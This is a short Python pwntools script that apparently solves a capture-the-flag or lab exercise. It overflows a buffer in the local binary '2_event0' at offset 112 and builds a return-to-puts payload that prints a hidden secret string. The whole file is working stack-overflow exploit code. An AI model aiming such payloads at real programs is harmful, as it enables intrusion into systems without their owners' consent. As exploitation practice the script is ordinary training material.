#!/usr/bin/python
from pwn import * 

def main():
	# Start process 
	p = process("./2_event0")
	
	# Prints process id	
	raw_input( str(p.proc.pid) )	
	
	# Payload crafting
	'''
	## Offset
	1094205761 found at offset: 112	

	## Secret string
	2_event0 : 0x8048940 ('X' <repeats 34 times>)

	08048480 <puts@plt>:
	 8048480:       ff 25 1c a0 04 08       jmp    *0x804a01c
	 8048486:       68 20 00 00 00          push   $0x20
	 804848b:       e9 a0 ff ff ff          jmp    8048430 <_init+0x30>	
	''' 
	puts = p32(0x08048480) 
	secret_str = p32(0x8048940)
	nop = "\x90" * 4
	
	payload = "A" * 112 + puts + nop + secret_str

	# Removes prompt
	data1 = p.recvrepeat(0.5)
	log.info(data1)

	# Sends payload
	p.send(payload)

	# Pass interaction back to user
	p.interactive()

if __name__ == "__main__":
	main()
